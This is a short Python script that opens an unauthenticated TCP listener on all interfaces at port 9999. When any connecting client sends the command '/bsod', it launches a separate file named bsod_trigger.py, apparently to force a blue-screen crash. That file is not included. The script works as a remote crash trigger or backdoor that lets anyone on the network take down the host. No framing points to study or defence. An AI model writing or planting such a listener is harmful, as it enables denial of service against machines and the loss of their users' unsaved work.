import socket
import subprocess
import sys
import os
import threading

HOST = '0.0.0.0'
PORT = 9999
BSOD_SCRIPT = 'bsod_trigger.py'

def handle_client(conn, addr):
    data = conn.recv(1024).decode().strip()
    if data == '/bsod':
        if os.path.exists(BSOD_SCRIPT):
            subprocess.Popen([sys.executable, BSOD_SCRIPT])
            response = "BSOD triggered"
        else:
            response = "Error: bsod_trigger.py not found"
    else:
        response = f"Unknown command: {data}"
    conn.sendall(response.encode())
    conn.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Server listening on {HOST}:{PORT}")
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()

if __name__ == '__main__':
    main()
